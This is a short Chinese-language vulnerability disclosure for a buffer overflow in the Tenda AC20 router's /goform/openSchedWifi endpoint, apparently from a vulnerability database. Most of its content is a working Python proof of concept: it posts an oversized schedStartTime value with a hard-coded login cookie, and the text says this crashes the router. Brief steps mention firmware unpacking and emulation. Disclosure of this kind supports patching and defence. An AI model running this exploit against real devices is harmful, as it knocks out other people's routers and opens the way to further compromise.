深圳市吉祥腾达科技有限公司-Tenda AC20 /goform/openSchedWifi文件缓冲区溢出漏洞

漏洞URL：http://ip/goform/openSchedWifi

POC：
from pwn import *
import requests

payload = b'a'*176

url = "http://192.168.100.254/goform/openSchedWifi"

cookie = {"Cookie":"password=12345"}
data = {"schedStartTime": b"\r" + payload}
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)
print(response.text)

1.固件解包分离出文件系统，分析文件

2.存在栈溢出漏洞函数


3.固件仿真模拟攻击
POC造成路由器崩溃
